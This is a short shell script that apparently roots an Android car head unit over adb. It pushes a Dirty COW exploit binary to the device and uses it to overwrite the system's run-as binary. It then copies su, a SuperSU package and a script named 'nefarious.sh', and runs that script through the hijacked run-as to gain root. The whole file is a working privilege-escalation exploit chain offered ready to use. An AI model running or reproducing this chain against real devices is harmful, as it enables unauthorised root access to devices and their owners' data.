#!/bin/sh

#use this to test on vm
#ARCH="x86"

#use this on head unit
ARCH="armeabi-v7a"

echo 'Please connect your computer with the head unit...'
~/Library/Android/sdk/platform-tools/adb wait-for-device

~/Library/Android/sdk/platform-tools/adb push libs/$ARCH/dirtycow /data/local/tmp/dcow
~/Library/Android/sdk/platform-tools/adb shell 'chmod 777 /data/local/tmp/dcow'

~/Library/Android/sdk/platform-tools/adb push libs/$ARCH/run-as /data/local/tmp/run-as
~/Library/Android/sdk/platform-tools/adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'

~/Library/Android/sdk/platform-tools/adb shell 'mkdir /data/local/tmp/rootme/'
~/Library/Android/sdk/platform-tools/adb push nefarious.sh /data/local/tmp/rootme/
~/Library/Android/sdk/platform-tools/adb push su /data/local/tmp/rootme/
~/Library/Android/sdk/platform-tools/adb push SuperSU-v2.78.apk /data/local/tmp/rootme/

~/Library/Android/sdk/platform-tools/adb disconnect
echo 'Wait 10 seconds...'
sleep 10
~/Library/Android/sdk/platform-tools/adb wait-for-device
echo 'OK'

~/Library/Android/sdk/platform-tools/adb shell 'chmod 777 /data/local/tmp/rootme/nefarious.sh'
~/Library/Android/sdk/platform-tools/adb shell 'echo /data/local/tmp/rootme/nefarious.sh | run-as'
